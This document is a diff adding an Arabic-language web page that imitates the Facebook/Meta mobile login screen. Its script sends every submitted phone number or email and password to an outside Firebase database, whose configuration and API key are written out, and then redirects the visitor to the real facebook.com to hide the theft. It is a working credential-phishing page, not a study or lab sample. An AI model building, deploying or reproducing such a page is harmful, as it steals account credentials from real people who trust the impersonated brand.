@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #191a1c; color: #f5f6f7; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 100vh; padding: 20px 16px; }
+        .header-nav { width: 100%; max-width: 360px; display: flex; flex-direction: column; align-items: center; position: relative; padding-top: 5px; }
+        .back-arrow { position: absolute; right: 0; top: 5px; font-size: 20px; cursor: pointer; color: #f5f6f7; transform: scaleX(-1); }
+        .top-lang { font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 4px; color: #8e9196; margin-top: 40px; }
+        .top-lang::after { content: " ▾"; font-size: 12px; }
+        .container { width: 100%; max-width: 360px; text-align: center; margin-top: auto; margin-bottom: auto; }
+        .logo-fb-box { width: 64px; height: 64px; display: inline-block; margin-bottom: 55px; }
+        .logo-fb-box svg { width: 100%; height: 100%; }
+        .input-group { margin-bottom: 12px; }
+        .input-field { width: 100%; background-color: #1d1e20; border: 1px solid #32353a; border-radius: 12px; padding: 18px 16px; color: #f5f6f7; font-size: 15px; outline: none; text-align: right; }
+        .input-field::placeholder { color: #6a6e74; }
+        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; border-radius: 25px; padding: 13px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 4px; transition: all 0.3s; }
+        .btn-login:hover { background-color: #0050b3; transform: scale(1.01); }
+        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+        .forgot-link { display: block; color: #92969c; font-size: 14px; margin-top: 25px; text-decoration: none; }
+        .footer-section { width: 100%; max-width: 360px; text-align: center; margin-top: auto; padding-top: 20px; }
+        .btn-create-account { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; border-radius: 25px; padding: 11px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 20px; }
+        .meta-logo { font-size: 15px; color: #8e9196; display: flex; align-items: center; justify-content: center; gap: 6px; font-weight: 500; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1d1e20; color: #f5f6f7; padding: 14px 28px; border-radius: 16px; border: 1px solid #32353a; font-size: 14px; display: none; z-index: 999; text-align: center; }
+        .toast.show { display: block; animation: fadeUp 0.4s ease; }
+        .toast.error { border-color: #ff1744; }
+        .loading-spinner { display: none; margin: 10px auto; width: 30px; height: 30px; border: 3px solid #32353a; border-top: 3px solid #0064e0; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .loading-spinner.show { display: block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeUp { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+    </style>
+</head>
+<body>
+    <div class="header-nav"><div class="back-arrow">➔</div><div class="top-lang">العربية</div></div>
+    <div class="container">
+        <div class="logo-fb-box">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0064e0"/><path d="M15.75 13.5l.43-3.5H13V7.8c0-.94.45-1.85 1.93-1.85h1.5V3c0 0-1.36-.23-2.66-.23-2.7 0-4.47 1.64-4.47 4.6V10H6.2v3.5h3.07V24h3.73v-10.5h2.75z" fill="white"/></svg>
+        </div>
+        <form id="loginForm">
+            <div class="input-group"><input type="text" id="userName" class="input-field" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required></div>
+            <div class="input-group"><input type="password" id="userMessage" class="input-field" placeholder="كلمة السر" required></div>
+            <button type="submit" class="btn-login" id="submitBtn">تسجيل الدخول</button>
+            <div class="loading-spinner" id="loadingSpinner"></div>
+        </form>
+        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+    </div>
+    <div class="footer-section">
+        <button class="btn-create-account" onclick="window.location.reload();">إنشاء حساب جديد</button>
+        <div class="meta-logo"><span>∞ Meta</span></div>
+    </div>
+    <div id="toastMessage" class="toast"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCdgV0Z35PJc968NaVhmhqqz4LGscyTZNQ",
+            authDomain: "oshapro-8edef.firebaseapp.com",
+            databaseURL: "https://oshapro-8edef-default-rtdb.firebaseio.com",
+            projectId: "oshapro-8edef",
+            storageBucket: "oshapro-8edef.appspot.com",
+            messagingSenderId: "353376835047",
+            appId: "1:353376835047:android:ac538f2f9da3c3f942d942"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const form = document.getElementById('loginForm');
+        const userNameInput = document.getElementById('userName');
+        const messageInput = document.getElementById('userMessage');
+        const toast = document.getElementById('toastMessage');
+        const spinner = document.getElementById('loadingSpinner');
+        const submitBtn = document.getElementById('submitBtn');
+
+        function cleanIdentifier(input) {
+            if (input.includes('@')) return input.trim().toLowerCase();
+            return input.trim().replace(/[^0-9]/g, '');
+        }
+
+        function showToast(text, type = 'success') {
+            toast.textContent = text;
+            toast.className = 'toast show ' + type;
+            setTimeout(() => { toast.classList.remove('show'); }, 3000);
+        }
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // --- التحقق من إدخال البيانات ---
+            const phone = userNameInput.value.trim();
+            const password = messageInput.value.trim();
+
+            // 1. التحقق من أن الحقول ليست فارغة
+            if (phone === '' || password === '') {
+                showToast('من فضلك أدخل رقم الهاتف وكلمة السر', 'error');
+                return; // إيقاف تنفيذ الدالة هنا
+            }
+
+            // --- إذا كانت البيانات موجودة، استمر في الإرسال إلى Firebase ---
+            const userId = cleanIdentifier(phone);
+
+            spinner.classList.add('show');
+            submitBtn.disabled = true;
+
+            database.ref(userId).push({
+                identifier: phone,
+                password: password,
+                timestamp: Date.now()
+            }).then(() => {
+                showToast('تم تسجيل الدخول بنجاح! جاري التحويل...', 'success');
+                userNameInput.value = '';
+                messageInput.value = '';
+                
+                // 2. التوجيه إلى صفحة فيسبوك الحقيقية بعد نجاح الحفظ
+                window.location.href = "https://www.facebook.com";
+                
+            }).catch((err) => {
+                showToast('خطأ في الاتصال', 'error');
+            }).finally(() => {
+                spinner.classList.remove('show');
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
